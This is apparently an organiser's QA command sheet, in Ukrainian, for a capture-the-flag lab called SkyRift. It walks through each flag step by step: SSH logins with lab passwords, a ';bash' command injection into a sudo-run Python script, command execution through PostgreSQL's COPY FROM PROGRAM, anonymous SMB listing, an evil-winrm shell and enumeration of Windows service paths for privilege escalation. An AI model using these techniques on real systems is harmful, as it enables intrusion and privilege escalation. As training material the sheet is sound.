# QA Commands — SkyRift CTF

## Operator_station — виправлення Flag_5

Додати прапор у flight_log_export.py:
```
sudo sed -i '/Usage: sudo -u commador/a # flag{Y0u_l1ke_privileges}' /opt/dronecorp/tools/flight_log_export.py
```

Видалити старий flag.txt:
```
sudo rm -f /home/commador/flag.txt
```

Перевірити:
```
cat /opt/dronecorp/tools/flight_log_export.py
```

---

## Flag_4 — SSH вхід (з Kali)

```
ssh -o HostKeyAlgorithms=+ssh-rsa operator@192.168.125.55
```
пароль: 3edcVFR456

Прапор:
```
cat ~/flag.txt
```

---

## Flag_5 — Читати вразливий скрипт

```
cat /opt/dronecorp/tools/flight_log_export.py
```

Запустити injection:
```
sudo -u commador /opt/dronecorp/tools/flight_log_export.py
```
Ввести: `;bash`

---

## Flag_6 — DB креди (від commador)

```
cat /home/commador/scripts/backup_db.sh
```

---

## Flag_6+7 — PostgreSQL (з Kali або commador)

Підключення:
```
psql -h 10.10.50.100 -U tech2 -d dronecorp_db
```
пароль: adfGt54DCf

RCE в psql:
```
CREATE TABLE cmd_exec (output text);
COPY cmd_exec FROM PROGRAM 'cat /var/lib/postgresql/flag.txt';
SELECT * FROM cmd_exec;
```

---

## Flag_8 — SMB анонімний доступ (з Kali)

```
smbclient -L //10.10.50.150 -N
```

```
smbclient //10.10.50.150/Updates -N
```

---

## Flag_9+10 — Windows WinRM (з Kali)

```
evil-winrm -i 10.10.50.150 -u svc_deploy -p "Deploy@2024!Drone"
```

Знайти сервіс:
```
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"
```

Перевірити права:
```
icacls "C:\Program Files"
```

Flag_10 з SYSTEM:
```
reg query HKLM\SOFTWARE\DroneCorp\UpdateSync
```

---

## Update Server — фінал

```
ssh -o HostKeyAlgorithms=+ssh-rsa grayraven@192.168.125.55
```
пароль: grayraven124
